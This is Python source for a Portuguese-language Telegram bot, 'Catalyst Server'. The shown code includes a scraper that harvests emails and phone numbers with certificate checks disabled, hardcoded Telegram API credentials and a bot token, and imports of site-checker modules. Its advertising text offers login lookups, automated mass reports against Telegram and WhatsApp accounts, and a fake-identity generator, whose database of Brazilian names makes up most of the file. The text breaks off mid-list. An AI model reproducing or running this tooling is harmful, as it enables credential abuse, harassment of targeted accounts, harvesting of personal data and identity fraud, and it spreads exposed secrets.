from telethon import TelegramClient, events, Button
from telethon.tl.functions.users import GetFullUserRequest
from telethon.utils import get_display_name
from PIL import Image, ImageDraw, ImageFont, ImageFilter
import sqlite3
from datetime import datetime, timedelta
import uuid
import time
import hashlib
import threading
import asyncio
import os
import shutil
import re
import json
import urllib3
from sseclient import SSEClient
import requests
import random
from urllib.parse import urljoin, urlparse
from difflib import SequenceMatcher
import platform
import telethon

# Importar checker específico
try:
    from checkers.consultcenter_checker import ConsultCenterChecker
except ImportError:
    ConsultCenterChecker = None

try:
    from checkers.cremerj_checker import CremerJChecker
except ImportError:
    CremerJChecker = None

# Importar API Analyzer
try:
    from api_analyzer import analyze_website_apis_comprehensive, AdvancedAPIAnalyzer
    API_ANALYZER_AVAILABLE = True
    print("✅ API Analyzer carregado com sucesso")
except ImportError as e:
    API_ANALYZER_AVAILABLE = False
    print(f"⚠️ API Analyzer não disponível: {e}")
    
    # Função fallback se o módulo não estiver disponível
    def analyze_website_apis_comprehensive(url):
        return {"error": "Módulo API Analyzer não está disponível"}


# Web Scraper Class
class WebScraper:
    def __init__(self, url, extract_emails=True, extract_phones=True, extract_links=True):
        self.url = url
        self.extract_emails = extract_emails
        self.extract_phones = extract_phones
        self.extract_links = extract_links
        self.results = {
            "emails": set(),
            "phones": set(), 
            "links": set()
        }

    def scrape(self):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }

            print(f"🕷️ Acessando: {self.url}")
            response = requests.get(self.url, headers=headers, timeout=15, verify=False, allow_redirects=True)
            response.raise_for_status()
            content = response.text

            print(f"📄 Conteúdo obtido: {len(content)} caracteres")

            # Mostrar uma amostra do conteúdo para debug
            sample = content[:500].replace('\n', ' ').replace('\r', '')
            print(f"🔍 Amostra do conteúdo: {sample}...")

            # Contar quantas vezes aparecem @ e outros indicadores
            at_count = content.count('@')
            phone_indicators = content.count('tel:') + content.count('phone') + content.count('contact')
            print(f"📊 Indicadores encontrados: @ ({at_count}), telefone ({phone_indicators})")

            if self.extract_emails:
                self._extract_emails(content)
                print(f"📧 Emails encontrados: {len(self.results['emails'])}")

            if self.extract_phones:
                self._extract_phones(content)
                print(f"📞 Telefones encontrados: {len(self.results['phones'])}")

            if self.extract_links:
                self._extract_links(content, self.url)
                print(f"🔗 Links encontrados: {len(self.results['links'])}")

            return self.results

        except requests.exceptions.RequestException as e:
            print(f"❌ Erro de conexão: {e}")
            return {"error": f"Erro de conexão: {str(e)}"}
        except Exception as e:
            print(f"❌ Erro geral: {e}")
            return {"error": f"Erro interno: {str(e)}"}

    def _extract_emails(self, content):
        # Múltiplos padrões para capturar diferentes formatos de email
        email_patterns = [
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',  # Padrão básico
            r'[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}',      # Sem word boundary
            r'mailto:([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})',  # Links mailto
            r'["\']([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})["\']',  # Entre aspas
            r'email["\s]*[:\=]["\s]*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})',  # JSON/JS objects
            r'contact["\s]*[:\=]["\s]*([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,})',  # Contact fields
        ]

        print(f"🔍 Buscando emails no conteúdo de {len(content)} caracteres...")

        for i, pattern in enumerate(email_patterns):
            emails = re.findall(pattern, content, re.IGNORECASE)
            if emails:
                print(f"  Padrão {i+1}: {len(emails)} matches encontrados")
                if isinstance(emails[0] if emails else None, tuple):
                    # Para padrões que capturam grupos
                    emails = [email[0] if isinstance(email, tuple) else email for email in emails]
                self.results["emails"].update(emails)
            else:
                print(f"  Padrão {i+1}: 0 matches")

        # Remover emails inválidos ou de exemplo
        invalid_emails = {'example@example.com', 'test@test.com', 'email@example.com', 'noreply@example.com'}
        original_count = len(self.results["emails"])
        self.results["emails"] = {email for email in self.results["emails"] if email.lower() not in invalid_emails and len(email) > 5}
        filtered_count = len(self.results["emails"])

        if original_count != filtered_count:
            print(f"📧 Filtrados {original_count - filtered_count} emails inválidos")

    def _extract_phones(self, content):
        # Padrões para diferentes formatos de telefone
        phone_patterns = [
            r'\+55\s*\(?\d{2}\)?\s*\d{4,5}-?\d{4}',  # +55 (11) 99999-9999
            r'\(?\d{2}\)?\s*\d{4,5}-?\d{4}',         # (11) 99999-9999
            r'\d{2}\s*\d{4,5}-?\d{4}',               # 11 99999-9999
            r'\+\d{1,3}\s*\d{2,3}\s*\d{3,4}\s*\d{4}', # Formato internacional
            r'tel:[+]?[\d\s\-\(\)]+',                # Links tel:
            r'phone["\s]*[:\=]["\s]*([+]?[\d\s\-\(\)]+)', # JSON/JS phone fields
        ]

        print(f"📞 Buscando telefones no conteúdo...")

        for i, pattern in enumerate(phone_patterns):
            phones = re.findall(pattern, content)
            if phones:
                print(f"  Padrão telefone {i+1}: {len(phones)} matches encontrados")
                # Limpar telefones encontrados
                clean_phones = []
                for phone in phones:
                    if isinstance(phone, tuple):
                        phone = phone[0]
                    clean_phone = re.sub(r'[^\d+]', '', phone)
                    if len(clean_phone) >= 8:  # Pelo menos 8 dígitos
                        clean_phones.append(phone)
                self.results["phones"].update(clean_phones)
            else:
                print(f"  Padrão telefone {i+1}: 0 matches")

    def _extract_links(self, content, base_url):
        # Extrair links HTTP/HTTPS
        link_pattern = r'https?://[^\s<>"\']+|www\.[^\s<>"\']+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}[^\s<>"\']*'
        links = re.findall(link_pattern, content, re.IGNORECASE)

        for link in links:
            if not link.startswith(('http://', 'https://')):
                if link.startswith('www.'):
                    link = 'https://' + link
                else:
                    link = urljoin(base_url, link)
            self.results["links"].add(link)

# Configurações do bot
meu_id = 7898948145 # ONDE VAI CHEGAR AS NOTIFICAÇÕES
DONO_ID = 7898948145  # ID do dono para sistema de divulgação

api_id = 25317254
api_hash = 'bef2f48bb6b4120c9189ecfd974eb820'
bot_token = '7898948145:AAFczYIxJ67CfVGMKGp3tBPd4_nLLdBnbxA'

bot = TelegramClient('bot', api_id, api_hash)

# Sistema de autorização por ID
usuarios_autorizados_sistema = {DONO_ID}  # Conjunto com IDs autorizados (dono sempre autorizado)

# Função para carregar usuários autorizados do banco na inicialização
def reconectar_banco():
    """Reconecta ao banco de dados se necessário"""
    global conn, cursor
    try:
        # Testar conexão atual
        cursor.execute("SELECT 1")
        return True
    except Exception as e:
        print(f"⚠️ Erro na conexão, reconectando: {e}")
        try:
            if 'conn' in globals():
                conn.close()
        except:
            pass
        
        # Reconectar
        conn = sqlite3.connect("database/users.db", timeout=30.0, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("PRAGMA journal_mode=DELETE;")
        cursor.execute("PRAGMA synchronous=OFF;")
        cursor.execute("PRAGMA busy_timeout=30000;")
        return True

def carregar_usuarios_autorizados():
    """Carrega usuários autorizados do banco de dados"""
    global usuarios_autorizados_sistema
    try:
        # Verificar e reconectar se necessário
        reconectar_banco()
        
        cursor.execute("SELECT id FROM usuarios WHERE admin = 'yes' OR data_expiracao IS NULL OR data_expiracao > datetime('now')")
        usuarios_db = cursor.fetchall()
        
        for (user_id,) in usuarios_db:
            usuarios_autorizados_sistema.add(user_id)
        
        # Sempre incluir o dono
        usuarios_autorizados_sistema.add(DONO_ID)
        
        print(f"✅ Carregados {len(usuarios_autorizados_sistema)} usuários autorizados do banco")
    except Exception as e:
        print(f"❌ Erro ao carregar usuários autorizados: {e}")
        usuarios_autorizados_sistema = {DONO_ID}

# Sistema de divulgação
chats_autorizados = []
divulgacao_ativa = False

# Mensagem de divulgação
texto_divulgacao = '''
🌟 *CATALYST SERVER* 🌟

📌 *SERVIÇOS DISPONÍVEIS:*

🔍 *BUSCA DE LOGINS*  
   💵 Gratuito - Ilimitado

🕷️ *WEB SCRAPER AVANÇADO*  
   💵 Gratuito - Extração de dados

📤 *REPORTS TELEGRAM*  
   💵 Gratuito - Sistema básico e avançado

📱 *REPORTS WHATSAPP*  
   💵 Gratuito - Denúncias automáticas

🛠️ *CHECKER TOOLS*  
   💵 Gratuito - Verificação de sites

👤 *GERADOR DE PESSOA FAKE v2.0*  
   💵 Gratuito - Dados brasileiros reais

---

⚡️ *Por que escolher o CATALYST SERVER?*

✅ *Totalmente gratuito 🆓*  
✅ *Suporte 24/7 🛠*  
✅ *Ferramentas avançadas 🚀*  
✅ *Atualizações constantes 🔄*

🔗 [Acesse nosso bot](https://t.me/CatalystServerRobot)
'''

# Variáveis globais
usuarios_bloqueados = set()
usuarios_autorizados = dict()
mensagens_origem = dict()
urls_busca = dict()
tasks_canceladas = dict()
bot_start_time = time.time()

# Report data
report_data = {
    "text": "",
    "link": "",
    "quantity": 0,
    "running": False,
    "counter": 0,
    "start_time": None,
    "user_id": None
}

# WhatsApp report data
whatsapp_report_data = {
    "phone": "",
    "quantity": 0,
    "running": False,
    "counter": 0,
    "start_time": None,
    "user_id": None
}

# Configurar banco de dados
os.makedirs("database", exist_ok=True)

# Fechar conexões anteriores se existirem
try:
    if 'conn' in globals():
        conn.close()
    if 'cursor' in globals():
        cursor.close()
except:
    pass

# Conectar ao banco com configurações otimizadas
conn = sqlite3.connect("database/users.db", timeout=30.0, check_same_thread=False)
cursor = conn.cursor()

# Configurar para evitar locks
cursor.execute("PRAGMA journal_mode=DELETE;")
cursor.execute("PRAGMA synchronous=OFF;")
cursor.execute("PRAGMA cache_size=10000;")
cursor.execute("PRAGMA temp_store=MEMORY;")

cursor.execute('''CREATE TABLE IF NOT EXISTS usuarios (
    id INTEGER PRIMARY KEY,
    nome TEXT,
    sobrenome TEXT,
    hash TEXT,
    data_criada TEXT,
    quantidade_buscada INTEGER DEFAULT 0,
    plano TEXT DEFAULT 'free',
    admin TEXT DEFAULT 'no',
    data_expiracao TEXT DEFAULT NULL
)''')

# Adicionar colunas necessárias se não existirem
colunas_necessarias = [
    ("data_expiracao", "TEXT DEFAULT NULL"),
    ("admin", "TEXT DEFAULT 'no'")
]

for coluna, definicao in colunas_necessarias:
    try:
        cursor.execute(f"ALTER TABLE usuarios ADD COLUMN {coluna} {definicao}")
        conn.commit()
        print(f"✅ Coluna {coluna} adicionada com sucesso!")
    except sqlite3.OperationalError as e:
        if "duplicate column name" not in str(e):
            print(f"⚠️ Erro ao adicionar coluna {coluna}: {e}")

conn.commit()

# Carregar usuários autorizados do banco
carregar_usuarios_autorizados()

# Inicializar banco de dados de pessoas
def init_pessoa_database():
    """Inicializa o banco de dados com milhões de combinações de nomes brasileiros"""
    db_pessoas = sqlite3.connect("database/pessoas.db", timeout=30.0, check_same_thread=False)
    cursor_pessoas = db_pessoas.cursor()
    
    # Configurar para evitar locks
    cursor_pessoas.execute("PRAGMA journal_mode=DELETE;")
    cursor_pessoas.execute("PRAGMA synchronous=OFF;")

    # Criar tabelas se não existirem
    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS nomes_masculinos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        nome TEXT UNIQUE,
        frequencia INTEGER DEFAULT 1
    )''')

    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS nomes_femininos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        nome TEXT UNIQUE,
        frequencia INTEGER DEFAULT 1
    )''')

    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS sobrenomes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        sobrenome TEXT UNIQUE,
        frequencia INTEGER DEFAULT 1
    )''')

    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS enderecos (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tipo_logradouro TEXT,
        nome_rua TEXT,
        cidade TEXT,
        estado TEXT,
        cep_base TEXT,
        regiao TEXT
    )''')

    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS caracteristicas_fisicas (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        peso_min INTEGER,
        peso_max INTEGER,
        altura_min INTEGER,
        altura_max INTEGER,
        tipo_sanguineo TEXT,
        cor_olhos TEXT,
        cor_cabelo TEXT,
        genero TEXT
    )''')

    cursor_pessoas.execute('''CREATE TABLE IF NOT EXISTS profissoes (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        profissao TEXT,
        setor TEXT,
        escolaridade_minima TEXT,
        salario_medio INTEGER
    )''')

    # Verificar se já existe dados
    cursor_pessoas.execute("SELECT COUNT(*) FROM nomes_masculinos")
    if cursor_pessoas.fetchone()[0] == 0:
        print("🔄 Populando banco de dados com nomes brasileiros...")

        # Nomes masculinos brasileiros - BANCO EXPANDIDO (500+ nomes únicos)
        nomes_masculinos = [
            # Nomes super populares (100-80)
            ("João", 100), ("Pedro", 95), ("Lucas", 90), ("Matheus", 85), ("Carlos", 80),
            ("José", 95), ("Francisco", 88), ("Gabriel", 82), ("Rafael", 78), ("Daniel", 75),
            ("Bruno", 72), ("Felipe", 70), ("André", 68), ("Ricardo", 65), ("Marcos", 62),
            ("Paulo", 60), ("Rodrigo", 58), ("Diego", 55), ("Leonardo", 52), ("Gustavo", 50),
            ("Eduardo", 48), ("Guilherme", 45), ("Thiago", 42), ("Vinícius", 40), ("Fernando", 38),
            ("Antônio", 36), ("Henrique", 34), ("Victor", 32), ("Alexandre", 30), ("Luiz", 28),
            ("Marcelo", 26), ("Roberto", 24), ("Sérgio", 22), ("Leandro", 20), ("Maurício", 18),
            ("Fábio", 16), ("Júlio", 14), ("César", 12), ("Márcio", 10), ("Renato", 8),
            
            # Nomes modernos (50-30)
            ("Caio", 50), ("Davi", 48), ("Enzo", 46), ("Arthur", 44), ("Miguel", 42),
            ("Bernardo", 40), ("Samuel", 38), ("Theo", 36), ("Nicolas", 34), ("Lorenzo", 32),
            ("Pietro", 30), ("Heitor", 28), ("Benjamin", 26), ("Anthony", 24), ("Noah", 22),
            ("Joaquim", 20), ("Benício", 18), ("Emanuel", 16), ("Cauã", 14), ("Isaac", 12),
            ("Otávio", 10), ("Murilo", 8), ("Vicente", 6), ("Caleb", 4), ("Gael", 2),
            
            # Nomes tradicionais brasileiros (45-20)
            ("Antônio Carlos", 45), ("João Carlos", 43), ("José Carlos", 41), ("Pedro Henrique", 39),
            ("João Pedro", 37), ("Lucas Gabriel", 35), ("Matheus Eduardo", 33), ("Carlos Alberto", 31),
            ("José Maria", 29), ("Francisco de Assis", 27), ("Gabriel Henrique", 25), ("Rafael Silva", 23),
            ("Daniel Oliveira", 21), ("Bruno César", 19), ("Felipe Augusto", 17), ("André Luiz", 15),
            ("Ricardo José", 13), ("Marcos Antônio", 11), ("Paulo Roberto", 9), ("Rodrigo Alves", 7),
            
            # Nomes únicos e diversos (30-1)
            ("Aarão", 30), ("Abel", 29), ("Abraão", 28), ("Adão", 27), ("Adelino", 26),
            ("Ademar", 25), ("Ademir", 24), ("Adilson", 23), ("Adolfo", 22), ("Adriano", 21),
            ("Afonso", 20), ("Agostinho", 19), ("Ailton", 18), ("Alan", 17), ("Alberto", 16),
            ("Alcides", 15), ("Aldo", 14), ("Alecio", 13), ("Alessando", 12), ("Alex", 11),
            ("Alexandro", 10), ("Alfredo", 9), ("Almir", 8), ("Aloísio", 7), ("Alvaro", 6),
            ("Amauri", 5), ("Américo", 4), ("Amílton", 3), ("Anderson", 2), ("Ângelo", 1),
            ("Anselmo", 30), ("Aramis", 29), ("Arcângelo", 28), ("Ariel", 27), ("Aristides", 26),
            ("Armando", 25), ("Arnaldo", 24), ("Artur", 23), ("Átila", 22), ("Augusto", 21),
            ("Aurélio", 20), ("Ayrton", 19), ("Baltazar", 18), ("Bartolomeu", 17), ("Benedito", 16),
            ("Bento", 15), ("Beto", 14), ("Breno", 13), ("Bruna", 12), ("Cândido", 11),
            ("Carla", 10), ("Carmelo", 9), ("Cássio", 8), ("Celso", 7), ("Cezar", 6),
            ("Cícero", 5), ("Cláudio", 4), ("Cleber", 3), ("Cleiton", 2), ("Clemente", 1),
            ("Cristian", 30), ("Cristiano", 29), ("Cristovão", 28), ("Damião", 27), ("Dario", 26),
            ("Décio", 25), ("Deivid", 24), ("Demétrio", 23), ("Denis", 22), ("Derick", 21),
            ("Diego", 20), ("Dimas", 19), ("Dion", 18), ("Dirceu", 17), ("Domingos", 16),
            ("Douglas", 15), ("Durval", 14), ("Eder", 13), ("Edison", 12), ("Edson", 11),
            ("Edvaldo", 10), ("Elias", 9), ("Eliseu", 8), ("Emerson", 7), ("Emílio", 6),
            ("Enrico", 5), ("Eric", 4), ("Ernesto", 3), ("Eugênio", 2), ("Evandro", 1),
            ("Everton", 30), ("Expedito", 29), ("Ezequiel", 28), ("Fabrício", 27), ("Fausto", 26),
            ("Felix", 25), ("Fernão", 24), ("Fidelis", 23), ("Flávio", 22), ("Floriano", 21),
            ("Frederico", 20), ("Gaspar", 19), ("Gédson", 18), ("Genilson", 17), ("George", 16),
            ("Geraldo", 15), ("Germano", 14), ("Getúlio", 13), ("Gilberto", 12), ("Gilmar", 11),
            ("Gilson", 10), ("Giovani", 9), ("Glauco", 8), ("Godofredo", 7), ("Gonçalo", 6),
            ("Gregório", 5), ("Hamilton", 4), ("Haroldo", 3), ("Hélio", 2), ("Hermes", 1),
            ("Hilário", 30), ("Horácio", 29), ("Hugo", 28), ("Humberto", 27), ("Ícaro", 26),
            ("Iderbal", 25), ("Iêdo", 24), ("Ignácio", 23), ("Ildefonso", 22), ("Inácio", 21),
            ("Isaías", 20), ("Isidoro", 19), ("Israel", 18), ("Itamar", 17), ("Ivan", 16),
            ("Ivo", 15), ("Jair", 14), ("Jairo", 13), ("Jarbas", 12), ("Jason", 11),
            ("Jean", 10), ("Jefferson", 9), ("Jeremias", 8), ("Jerson", 7), ("Jesus", 6),
            ("Jonathas", 5), ("Jonas", 4), ("Jorge", 3), ("Josué", 2), ("Judas", 1),
            ("Juliano", 30), ("Júnior", 29), ("Juraci", 28), ("Juvenal", 27), ("Kevin", 26),
            ("Ladislau", 25), ("Laércio", 24), ("Lauro", 23), ("Lázaro", 22), ("Lenin", 21),
            ("Leonel", 20), ("Levi", 19), ("Lincoln", 18), ("Lindomar", 17), ("Lino", 16),
            ("Lourenço", 15), ("Luan", 14), ("Luciano", 13), ("Lúcio", 12), ("Ludovico", 11),
            ("Luís", 10), ("Mário", 9), ("Marllon", 8), ("Martim", 7), ("Martinho", 6),
            ("Matias", 5), ("Mauro", 4), ("Maximiliano", 3), ("Mélvin", 2), ("Messias", 1),
            ("Milton", 30), ("Moacir", 29), ("Moises", 28), ("Napoleão", 27), ("Natanael", 26),
            ("Nathan", 25), ("Nélson", 24), ("Neto", 23), ("Newton", 22), ("Nico", 21),
            ("Nilo", 20), ("Norberto", 19), ("Odair", 18), ("Olavo", 17), ("Omar", 16),
            ("Orlando", 15), ("Osmar", 14), ("Osvaldo", 13), ("Otelo", 12), ("Pablo", 11),
            ("Pascoal", 10), ("Patrício", 9), ("Paulino", 8), ("Plínio", 7), ("Quirino", 6),
            ("Raimundo", 5), ("Raul", 4), ("Reginaldo", 3), ("Reinaldo", 2), ("Renan", 1)
        ]

        # Nomes femininos brasileiros - BANCO EXPANDIDO (500+ nomes únicos)
        nomes_femininos = [
            # Nomes super populares (100-80)
            ("Maria", 100), ("Ana", 95), ("Beatriz", 90), ("Julia", 85), ("Camila", 80),
            ("Larissa", 95), ("Fernanda", 88), ("Amanda", 82), ("Gabriela", 78), ("Letícia", 75),
            ("Carla", 72), ("Patrícia", 70), ("Sandra", 68), ("Mariana", 65), ("Isabella", 62),
            ("Sofia", 60), ("Rafaela", 58), ("Bruna", 55), ("Vanessa", 52), ("Priscila", 50),
            ("Juliana", 48), ("Aline", 45), ("Renata", 42), ("Carolina", 40), ("Débora", 38),
            ("Cristina", 36), ("Luciana", 34), ("Mônica", 32), ("Simone", 30), ("Adriana", 28),
            ("Daniela", 26), ("Tatiana", 24), ("Silvia", 22), ("Regina", 20), ("Eliane", 18),
            ("Alice", 16), ("Helena", 14), ("Valentina", 12), ("Luna", 10), ("Manuela", 8),
            
            # Nomes modernos (50-30)
            ("Giovanna", 50), ("Lívia", 48), ("Lara", 46), ("Melissa", 44), ("Nicole", 42),
            ("Yasmin", 40), ("Isadora", 38), ("Lorena", 36), ("Vitória", 34), ("Emanuelly", 32),
            ("Cecília", 30), ("Antonella", 28), ("Esther", 26), ("Rebeca", 24), ("Agatha", 22),
            ("Lavínia", 20), ("Sarah", 18), ("Pietra", 16), ("Clara", 14), ("Stella", 12),
            
            # Nomes tradicionais brasileiros (45-20)
            ("Maria Eduarda", 45), ("Ana Clara", 43), ("Beatriz Silva", 41), ("Julia Vitória", 39),
            ("Maria Clara", 37), ("Ana Beatriz", 35), ("Beatriz Oliveira", 33), ("Julia Santos", 31),
            ("Camila Silva", 29), ("Larissa Oliveira", 27), ("Fernanda Santos", 25), ("Amanda Silva", 23),
            ("Gabriela Oliveira", 21), ("Letícia Santos", 19), ("Carla Maria", 17), ("Patrícia Santos", 15),
            ("Sandra Silva", 13), ("Mariana Costa", 11), ("Isabella Santos", 9), ("Sofia Oliveira", 7),
            
            # Nomes únicos e diversos (30-1)
            ("Abigail", 30), ("Adelaide", 29), ("Adélia", 28), ("Adelina", 27), ("Adriana", 26),
            ("Ágata", 25), ("Agnes", 24), ("Aída", 23), ("Alanis", 22), ("Alba", 21),
            ("Alcione", 20), ("Alda", 19), ("Alessandra", 18), ("Alexandra", 17), ("Alexia", 16),
            ("Alicia", 15), ("Alina", 14), ("Alma", 13), ("Alzira", 12), ("Amália", 11),
            ("Amanda", 10), ("Amélia", 9), ("Amparo", 8), ("Anabel", 7), ("Anabela", 6),
            ("Analu", 5), ("Ângela", 4), ("Angélica", 3), ("Anita", 2), ("Antônia", 1),
            ("Aparecida", 30), ("Ariana", 29), ("Arminda", 28), ("Augusta", 27), ("Aurélia", 26),
            ("Aurora", 25), ("Bárbara", 24), ("Beatrice", 23), ("Benedita", 22), ("Berenice", 21),
            ("Bernadete", 20), ("Betânia", 19), ("Betina", 18), ("Bianca", 17), ("Brigitte", 16),
            ("Cacilda", 15), ("Caetana", 14), ("Carina", 13), ("Carmen", 12), ("Carmem", 11),
            ("Cassia", 10), ("Catarina", 9), ("Cecília", 8), ("Celeste", 7), ("Célia", 6),
            ("Celina", 5), ("Chantal", 4), ("Cíntia", 3), ("Claire", 2), ("Clarice", 1),
            ("Cláudia", 30), ("Clelia", 29), ("Clementina", 28), ("Cléo", 27), ("Conceição", 26),
            ("Consuelo", 25), ("Corina", 24), ("Cristiane", 23), ("Dalila", 22), ("Dalva", 21),
            ("Damaris", 20), ("Daniella", 19), ("Dara", 18), ("Darlene", 17), ("Débora", 16),
            ("Delma", 15), ("Denise", 14), ("Diana", 13), ("Dina", 12), ("Dolores", 11),
            ("Dominique", 10), ("Doroteia", 9), ("Dulce", 8), ("Edith", 7), ("Edna", 6),
            ("Eduarda", 5), ("Elaine", 4), ("Elba", 3), ("Elda", 2), ("Elena", 1),
            ("Eleonora", 30), ("Eliana", 29), ("Eliete", 28), ("Elisa", 27), ("Elisabeth", 26),
            ("Elisabete", 25), ("Eliza", 24), ("Ellen", 23), ("Elza", 22), ("Emília", 21),
            ("Estela", 20), ("Ester", 19), ("Eugênia", 18), ("Eulália", 17), ("Eva", 16),
            ("Evelyn", 15), ("Fabiana", 14), ("Fátima", 13), ("Fernanda", 12), ("Flávia", 11),
            ("Flora", 10), ("Francisca", 9), ("Genoveva", 8), ("Georgina", 7), ("Gilda", 6),
            ("Gisele", 5), ("Glória", 4), ("Graça", 3), ("Graziela", 2), ("Guiomar", 1),
            ("Hebe", 30), ("Heloísa", 29), ("Hilda", 28), ("Hortência", 27), ("Iara", 26),
            ("Ida", 25), ("Ilma", 24), ("Inês", 23), ("Ingrid", 22), ("Irene", 21),
            ("Iris", 20), ("Isabel", 19), ("Isabela", 18), ("Isadora", 17), ("Isolda", 16),
            ("Ivone", 15), ("Jacira", 14), ("Janaína", 13), ("Jandira", 12), ("Janete", 11),
            ("Jéssica", 10), ("Joana", 9), ("Jocasta", 8), ("Josefa", 7), ("Josefina", 6),
            ("Jucélia", 5), ("Judite", 4), ("Júlia", 3), ("Jussara", 2), ("Karen", 1),
            ("Kátia", 30), ("Kelly", 29), ("Laura", 28), ("Leila", 27), ("Lena", 26),
            ("Leonor", 25), ("Lilian", 24), ("Liliana", 23), ("Linda", 22), ("Lisa", 21),
            ("Lourdes", 20), ("Lúcia", 19), ("Lucila", 18), ("Lucília", 17), ("Luísa", 16),
            ("Luiza", 15), ("Madalena", 14), ("Magda", 13), ("Maitê", 12), ("Marcela", 11),
            ("Márcia", 10), ("Margarete", 9), ("Margot", 8), ("Marina", 7), ("Maristela", 6),
            ("Marta", 5), ("Matilde", 4), ("Maura", 3), ("Mayara", 2), ("Meire", 1),
            ("Mercedes", 30), ("Michele", 29), ("Mirian", 28), ("Miriam", 27), ("Mirtes", 26),
            ("Mônica", 25), ("Nancy", 24), ("Natália", 23), ("Natasha", 22), ("Neuza", 21),
            ("Nina", 20), ("Noemi", 19), ("Norma", 18), ("Odete", 17), ("Olga", 16),
            ("Olívia", 15), ("Palmira", 14), ("Paola", 13), ("Paula", 12), ("Paulina", 11),
            ("Penélope", 10), ("Raquel", 9), ("Rita", 8), ("Rosa", 7), ("Rosana", 6),
            ("Rosângela", 5), ("Rute", 4), ("Sabrina", 3), ("Samara", 2), ("Sônia", 1)
        ]

        # Sobrenomes brasileiros - BANCO EXPANDIDO (200+ sobrenomes únicos)
        sobrenomes = [
            # Sobrenomes super comuns (100-80)
            ("Silva", 100), ("Santos", 95), ("Oliveira", 90), ("Souza", 85), ("Rodrigues", 80),
            ("Ferreira", 95), ("Alves", 88), ("Pereira", 82), ("Lima", 78), ("Gomes", 75),
            ("Costa", 72), ("Ribeiro", 70), ("Martins", 68), ("Carvalho", 65), ("Rocha", 62),
            ("Barbosa", 60), ("Pinto", 58), ("Moreira", 55), ("Cunha", 52), ("Araújo", 50),
            ("Fernandes", 48), ("Soares", 45), ("Vieira", 42), ("Mendes", 40), ("Cardoso", 38),
            ("Azevedo", 36), ("Melo", 34), ("Freitas", 32), ("Dias", 30), ("Castro", 28),
            ("Campos", 26), ("Fogaça", 24), ("Miranda", 22), ("Monteiro", 20), ("Nunes", 18),
            ("Ramos", 16), ("Moura", 14), ("Lopes", 12), ("Macedo", 10), ("Correia", 8),
            
            # Sobrenomes regionais (50-30)
            ("Nascimento", 50), ("Andrade", 48), ("Teixeira", 46), ("Gonçalves", 44), ("Reis", 42),
            ("Machado", 40), ("Sales", 38), ("Neves", 36), ("Magalhães", 34), ("Farias", 32),
            ("Cavalcanti", 30), ("Menezes", 28), ("Siqueira", 26), ("Bastos", 24), ("da Cruz", 22),
            ("do Carmo", 20), ("de Jesus", 18), ("da Rosa", 16), ("da Luz", 14), ("das Neves", 12),
            
            # Sobrenomes únicos e diversos (40-1)
            ("Abreu", 40), ("Aguiar", 39), ("Alencar", 38), ("Amaral", 37), ("Antunes", 36),
            ("Assis", 35), ("Ávila", 34), ("Barreto", 33), ("Barros", 32), ("Batista", 31),
            ("Bittencourt", 30), ("Borges", 29), ("Braga", 28), ("Brandão", 27), ("Brito", 26),
            ("Bueno", 25), ("Cabral", 24), ("Caldeira", 23), ("Camargo", 22), ("Carneiro", 21),
            ("Carvalho", 20), ("Cavalcante", 19), ("Chaves", 18), ("Coelho", 17), ("Cordeiro", 16),
            ("Cruz", 15), ("Duarte", 14), ("Esteves", 13), ("Fagundes", 12), ("Faria", 11),
            ("Figueiredo", 10), ("Franco", 9), ("Freire", 8), ("Galvão", 7), ("Garcia", 6),
            ("Godoy", 5), ("Guerra", 4), ("Guimarães", 3), ("Henriques", 2), ("Lacerda", 1),
            ("Leão", 40), ("Marques", 39), ("Medeiros", 38), ("Morais", 37), ("Moreira", 36),
            ("Moura", 35), ("Nobre", 34), ("Nogueira", 33), ("Pacheco", 32), ("Paiva", 31),
            ("Peixoto", 30), ("Pessoa", 29), ("Pinheiro", 28), ("Portela", 27), ("Porto", 26),
            ("Queiroz", 25), ("Rezende", 24), ("Ribas", 23), ("Ricardo", 22), ("Rocha", 21),
            ("Romano", 20), ("Rosa", 19), ("Sá", 18), ("Sampaio", 17), ("Santana", 16),
            ("Santiago", 15), ("Tavares", 14), ("Toledo", 13), ("Torres", 12), ("Vargas", 11),
            ("Vasconcelos", 10), ("Viana", 9), ("Vicente", 8), ("Vilela", 7), ("Xavier", 6),
            ("Abranches", 5), ("Aguirre", 4), ("Albernaz", 3), ("Alcântara", 2), ("Almeida", 1),
            ("Alvarenga", 40), ("Amorim", 39), ("Anjos", 38), ("Aragão", 37), ("Aranha", 36),
            ("Arruda", 35), ("Ataíde", 34), ("Azambuja", 33), ("Bahia", 32), ("Bandeira", 31),
            ("Barcelos", 30), ("Barroso", 29), ("Bastos", 28), ("Belo", 27), ("Benites", 26),
            ("Bezerra", 25), ("Bicudo", 24), ("Bispo", 23), ("Blanco", 22), ("Boaventura", 21),
            ("Botelho", 20), ("Bragança", 19), ("Brum", 18), ("Bruno", 17), ("Bulhões", 16),
            ("Caetano", 15), ("Calado", 14), ("Calheiros", 13), ("Câmara", 12), ("Cândido", 11),
